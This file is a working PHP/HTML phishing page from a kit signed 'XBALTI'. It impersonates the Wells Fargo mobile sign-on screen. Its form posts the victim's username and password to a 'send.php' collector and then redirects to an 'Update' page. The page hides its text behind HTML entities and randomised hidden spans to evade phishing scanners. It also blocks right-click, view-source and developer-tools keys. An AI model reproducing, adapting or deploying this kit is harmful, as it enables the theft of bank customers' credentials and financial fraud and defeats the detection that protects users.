<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
include '../anti.php';
$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <title>&#77;&#111;&#98;&#105;&#108;&#101;&#32;&#83;&#105;&#103;&#110;&#32;&#111;&#110;&#32;&verbar;&#32;&#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;</title>
	<link rel="icon" href="../img/favicon.ico" />
    <meta name="description" content="Click here to sign on to your Wells Fargo account from your mobile phone." />
    <link rel="stylesheet" href="../css/fonts.css" type="text/css">
    <link rel="stylesheet" href="../css/mstyle.css" type="text/css">
    <link type="text/css" href="../css/mstyle1.css" rel="stylesheet" media="screen,projection,print" />
    <script src="../js/jquery.min.js"></script>
	<style>
			#loading {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }
	</style>
</head>

<body theme="ssep" id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  brand-fp" lob="cob" contextPath="/auth" devicetype="mobile">
	<div id="loading" style="display:none;" >
    </div>
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  header brand-fp" id="header">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  wf_logo" role="link">
            <img src="../img/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
        </div>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  hamburger_menu" role="link">
            <a href="#"><img src="../img/FP.svg" alt="Home" role="img"></a>
        </div>
    </div>

    <main role="main">
        <article>

            <div id='form'>
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  banner"> <span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#87;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101; </h1>
                <h2 class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  security-link flex-cntr">
        <img
        src="../img/lock.svg"
        alt="" aria-hidden="true">
        <a class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  "
            href="#"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101; &amp; <span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#77;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#121;</a></h2>
                <form action="" name="login" id="login" method='post' autocomplete="off">

                    <div id="usernameWrapper" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  bim-input-wrapper">
                        <label id="username" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  ab1 bim-input-label " for="user"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;</label>

                        <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  bim-input" type="text" name="user" id="user" autocomplete="off" maxlength="14" required />

                    </div>
                    <div id="passwordWrapper" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  bim-input-wrapper">
                        <label id="lblForPassword" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  ab2 bim-input-label" for="pass"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#100;</label>
                        <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  bim-input" type="password" id="pass" name="pass" autocomplete="off" maxlength="32" required />
                    </div>
                    <div id="chkSave">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  save-usr-name">

                            <input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username" />

                            <label for="saveUsernameCheckbox">
                                <span aria-labelledby="usernameLbl" role="checkbox" tabindex="0" aria-checked="false" aria-live="polite"></span>
                                <p id="usernameLbl"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;</p>
                            </label>
                        </div>
                    </div>

                    <div>
                        <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  primary cta-btn sign-on" data-type="primary" aria-label="Sign On"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;</button>
                    </div>
                    <div id="forgot">
                        <p id="forgot">
                            <span lang="en"><a  href="#"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#100;&sol;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#85;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;&quest;</a></span></p>
                    </div>

                    <div>
                        <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  ntwf-link"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#119;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111; <span lang="en"><i><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#87;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;</i></span><sup>&reg;</sup>&quest;</p>
                        <button id="enrollButton" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  secondary-gray cta-btn enroll" control="button" aria-label="enroll"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;</button>
                    </div>

                    <input name="origin" id="origin" type="hidden" value="mobilebrowser" />
                    <input name="save-username" id="saveUsername" type="hidden" value="false" />

                    <input name="pcg" type="hidden" value=" " />

                    <input type="hidden" name="segmentation" value=" cob" />

                </form>

            </div>

            <div id="footer">
                <div id="links">
                    <p><a href="#" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#82;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#73;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#86;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#89;&comma;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#107;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;&comma;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#121; &amp;
                <span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;</a> <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link-separator"></span><a href="#" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115; </a>
                    </p>
                    <p><a href="#" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link online-acc"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#99;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;</a>

                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link-separator"></span>
                        <a href="#" class="<?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  <?php echo substr(str_shuffle($permitted_chars), 0, 20);?>  link e-sign"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#69;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#73;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#71;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;</a>

                    </p>
                    <p><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#169; <span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#50;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#48;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#50;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#48; <span lang="en"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#87;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#111;</span>&period;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#103;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#118;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 20);?></span>&#100;&period;</p>
                </div>
                <div id="img">
                </div>
            </div>

        </article>
    </main>
	<script src="../js/jquery.validate.min.js"></script>
	<script>
$(function() {
   $("form[name='login']").validate({
    rules: {
	   user : "required",
	   pass : "required",
    },
       messages: {
	   user : "",
	   pass : "",
    },
     submitHandler: function(form) {
            $("#loading").show(500);
                 $.post("../XBALTI/send.php", $("#login").serialize(), function(result) {
                          setTimeout(function() {
                                $(location).attr("href", "../Update");
                        },2000);
            });
        },
  
    });
});
</script>
	<script>
$(document).ready(function(){
    $('#user').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $(".ab1").removeClass("above");	
		} 
        else {
		$(".ab1").addClass("above"); 
			}});
    });
		$(document).ready(function(){
    $("#user").click(function(){
     $(".ab1").addClass("above"); 
    });
});
$(document).ready(function(){
    $('#pass').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $(".ab2").removeClass("above");	
		} 
        else {
		$(".ab2").addClass("above"); 
			}});
    });
		$(document).ready(function(){
    $("#pass").click(function(){
     $(".ab2").addClass("above"); 
    });
});
	</script>
	<script language="JavaScript">

       window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
</script>
<script>
$(document).ready(function(){
    $(document).keydown(function(event) {
        if (event.ctrlKey==true && (event.which == '118' || event.which == '86')) {
            event.preventDefault();
         }
    });
});
$(document).ready(function () {
    var ambit = $(document);
    ambit.on('taphold', function (e) {
        e.preventDefault();
        return false;
    });
});
</script>
</body>

</html>